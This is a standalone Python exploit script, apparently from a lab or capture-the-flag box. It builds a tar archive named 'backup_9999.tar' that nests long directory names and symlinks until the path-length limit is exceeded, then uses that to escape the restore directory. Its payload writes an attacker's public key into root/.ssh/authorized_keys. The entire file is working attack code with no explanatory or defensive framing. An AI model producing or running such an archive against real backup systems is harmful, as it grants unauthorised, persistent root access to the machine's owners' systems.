#!/usr/bin/env python3
import tarfile
import io
import os

DEST_DIR = "/opt/backup_clients/restored_backups/restore_poc/"
DEPTH_TO_ROOT = 4
PUB_KEY_PATH = "/tmp/root_key.pub"
TARGET_FILE = "root/.ssh/authorized_keys"
OUTPUT = "backup_9999.tar"

def main():
    if not os.path.exists(PUB_KEY_PATH):
        print(f"[!] Error: {PUB_KEY_PATH} not found.")
        return

    with open(PUB_KEY_PATH, "rb") as f:
        PAYLOAD = f.read()

    MAX_PATH = 4096
    STEPS = "abcdefghijklmnop"
    
    component_len = (MAX_PATH - len(DEST_DIR)) // (len(STEPS) + 1)
    component = 'd' * component_len

    with tarfile.open(OUTPUT, "w") as tar:
        path = ""
        step_path = ""

        for step in STEPS:
            dir_path = os.path.join(path, component) if path else component
            dir_info = tarfile.TarInfo(dir_path)
            dir_info.type = tarfile.DIRTYPE
            tar.addfile(dir_info)

            sym_path = os.path.join(path, step) if path else step
            sym_info = tarfile.TarInfo(sym_path)
            sym_info.type = tarfile.SYMTYPE
            sym_info.linkname = component
            tar.addfile(sym_info)

            path = dir_path
            step_path = os.path.join(step_path, step) if step_path else step

        long_link_name = 'l' * 254
        escape_sym_path = os.path.join(step_path, long_link_name)
        escape_sym_info = tarfile.TarInfo(escape_sym_path)
        escape_sym_info.type = tarfile.SYMTYPE
        escape_sym_info.linkname = os.path.join(*[".."] * len(STEPS))
        tar.addfile(escape_sym_info)

        escape_info = tarfile.TarInfo("escape")
        escape_info.type = tarfile.SYMTYPE
        escape_info.linkname = os.path.join(escape_sym_path, *[".."] * DEPTH_TO_ROOT)
        tar.addfile(escape_info)

        ak_info = tarfile.TarInfo("escape/" + TARGET_FILE)
        ak_info.type = tarfile.REGTYPE
        ak_info.size = len(PAYLOAD)
        ak_info.mode = 0o600
        tar.addfile(ak_info, io.BytesIO(PAYLOAD))

    print(f"[+] Successfully generated {OUTPUT}")

if __name__ == "__main__":
    main()